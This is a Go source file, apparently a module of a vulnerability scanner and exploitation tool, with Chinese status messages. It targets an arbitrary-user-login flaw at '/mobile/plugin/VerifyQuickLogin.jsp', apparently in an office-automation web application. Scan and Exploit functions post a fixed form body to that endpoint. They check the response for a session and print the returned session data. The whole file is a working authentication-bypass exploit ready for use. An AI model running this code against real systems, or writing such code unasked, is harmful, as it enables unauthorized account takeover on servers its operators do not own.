package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc08 struct {
}

func (s *Wc08) Scan(targetUrl string) {
	vulnerable, err := Wc08scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc08] 存在VerifyQuickLogin 任意用户登录")
	} else {
		color.White("[Wc08] 不存在VerifyQuickLogin 任意用户登录")
	}
}

func (*Wc08) Exploit(targetUrl string) {
	runResult, err := Wc08runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc08scancore(targetUrl string) (bool, error) {
	url := "/mobile/plugin/VerifyQuickLogin.jsp"
	data := "identifier=1&language=1&ipaddress=x.x.x.x"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "session") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc08runcore(targetUrl string) (string, error) {
	url := "/mobile/plugin/VerifyQuickLogin.jsp"
	data := "identifier=1&language=1&ipaddress=x.x.x.x"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "session") {
		return "存在VerifyQuickLogin 任意用户登录\n" + resContent, nil
	} else {
		return "", nil
	}
}
